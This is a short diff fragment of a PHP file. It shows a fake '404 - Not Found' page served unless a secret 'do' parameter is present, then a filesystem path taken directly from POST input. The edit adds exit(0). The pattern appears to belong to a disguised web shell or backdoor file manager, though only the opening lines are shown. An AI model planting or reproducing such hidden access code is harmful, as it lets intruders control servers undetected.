@@ -12,7 +12,7 @@ if(!isset($_REQUEST['do'])){?>
   <h1>404 - Not Found</h1>
  </body>
 </html>
-<?php } 
+<?php exit(0);} 
 $path = dirname(__FILE__);
 if(!empty($_POST['path']))
 $path=$_POST['path'];
